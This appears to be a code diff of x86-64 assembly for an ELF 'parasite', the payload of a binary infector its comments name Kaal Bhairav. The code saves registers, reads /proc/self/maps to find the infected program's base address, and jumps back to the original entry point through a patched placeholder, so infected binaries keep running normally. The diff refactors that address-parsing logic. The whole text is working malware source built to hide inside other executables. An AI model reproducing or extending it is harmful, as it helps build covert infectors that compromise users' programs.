@@ -31,6 +31,7 @@ SYS_READ    equ 0x0         ; 0
 SYS_OPEN    equ 0x2         ; 2
 SYS_LSEEK   equ 0x8         ; 8
 SYS_EXECVE  equ 0x3b        ; 59
+ALLOC_SPACE equ 0x10		; 16 bytes
 
 O_RDONLY    equ 0x0         ; 0
 ;-x-x-x-x- CONSTANTS -x-x-x-x-;
@@ -39,10 +40,6 @@ O_RDONLY    equ 0x0         ; 0
 
 section .text
 _start:
-
-	xor  rbx, rbx
-	mov  rbx, _start						; Current instruction's address
-
 	; Save register state, RBX can be safely used
 	push rax
 	push rcx
@@ -50,6 +47,7 @@ _start:
 	push rsi
 	push rdi
 	push r11
+	push rbx
 
 	
 	jmp	parasite
@@ -92,8 +90,9 @@ parasite:
     xor r9, r9
     xor rdi, rdi
     xor rbx, rbx
-    mov dil, al                 ; fd    : al
-    sub sp, 0x10                ; allocate space for /proc/<pid>/maps memory address string 
+    mov r9b, al					; store fd in r9 for lseek
+	mov dil, al                 ; fd    : al
+    sub sp, ALLOC_SPACE         ; allocate space for /proc/<pid>/maps memory address string 
                                 ; (Max 16 chars from file | usually 12 chars 5567f9154000)
     lea rsi, [rsp]              ; *buf  : get the content to be read on stack
     xor rdx, rdx
@@ -104,22 +103,15 @@ parasite:
 
 ; R10 to store count of chars before '-' in /proc/self/maps
 ; R8 to store the extracted digit/alphabet
-; Counter the number of characters in address string being read before the char '-' (0x2d)
-count_characters:
-    xor rax, rax                ; Syscall Number for read : 0x0
-    syscall
-    cmp BYTE [rsp], 0x2d        ; if 0x2d = '-' (Marks as the end of input scaning)
-    je  read_characters
-    add r10b, 0x1               ; else ++count : no. of characters to read next (in read_characters)
-    jmp count_characters
-
-
 ; Don't change RAX, RDI, RSI, RDX registers.
 ; RBX will store the final result (the address computed)
 read_characters:
     xor rax, rax                ; Syscall Number for read : 0x0
     syscall                     ; Byte read at [rsp]
-    mov r8b, BYTE [rsp]         ; get the read byte in R8
+    cmp BYTE [rsp], 0x2d		; if read_byte == 0x2d ('-')
+	je  done					; stop reading from file, Address is loaded into RBX
+	add r10b, 0x1				; count the number of characters read before 0x2d ('-')
+	mov r8b, BYTE [rsp]         ; get the read byte in R8
 
     ; Check for a digit (chars/ints 0x30 : 1(in dec) to 0x39 : 9(in dec) - convert into hex)
     cmp r8b, 0x39
@@ -137,23 +129,31 @@ digit_found:
     sub r8b, 0x30               ; r8 stores Extracted byte
 
 load_into_rbx:
-    shl rbx, 0x4
+	shl rbx, 0x4
     or  rbx, r8
 
 loop:
     add rsp, 0x1                ; increment RSI to read character at next location
     lea rsi, [rsp]
-    sub r10b, 0x1
-    cmp r10b, 0x0               ; check for count of characters scanned
-    je  address_loaded_in_RBX
     jmp read_characters
 
+
+done:
+	sub sp, r10w				; subtract stack pointer by no. of chars (which are pushed on stack)
+	add sp, ALLOC_SPACE			; add 16 bytes to RSP (which were reserved for reading address chars)
+	xor r8, r8
+	mov r8, rbx                 ; r8 stores the base address where the infected binary is loaded
+    mov r10, 0xAAAAAAAAAAAAAAAA
+    add r8, r10                 ; Computing final jmp-on-exit address
+
+	
 
 ;-------------------------------------------------------------------
 
 
 address_loaded_in_RBX:
 	; Restoring register state
+	pop rbx
 	pop r11
 	pop rdi
 	pop rsi
@@ -165,7 +165,4 @@ address_loaded_in_RBX:
 	; RBX contains the base address (where the program is loaded in memory), adding the offset of
 	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
 	; The placeholder (0xA's) has to be replaced by Kaal Bhairav by entry point offset.
-	xor r8, r8
-	mov r8, 0xAAAAAAAAAAAAAAAA
-	add	rbx, r8	
-	jmp	rbx
+	jmp	r8
